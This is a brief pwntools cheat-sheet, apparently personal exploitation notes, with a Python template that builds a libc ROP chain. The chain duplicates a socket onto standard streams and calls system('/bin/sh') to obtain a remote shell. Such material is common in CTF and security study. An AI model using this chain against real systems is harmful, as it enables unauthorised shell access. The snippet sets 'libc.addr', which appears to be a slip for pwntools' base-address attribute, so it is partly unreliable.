PWNTOOLS
=
[PWNtools Document](http://pwntools.readthedocs.io/en/stable/)
# Generate ROP
[pwnlib.rop.rop](http://docs.pwntools.com/en/stable/rop/rop.html?highlight=ROP)
```python
libc=ELF('./libc.so.6')
#set baseaddress
libc.addr=libcbase
rop = ROP(libc, badchars="\n")
#redirect to socket
rop.dup2(SOCKFD, 0)
rop.dup2(SOCKFD, 1)
rop.dup2(SOCKFD, 2)
#call system func
rop.system(next(libc.search("/bin/sh")))
#call read
rop.read(SOCKFD,buf,len)
rop.call('read', [SOCKFD,buf,len])
```
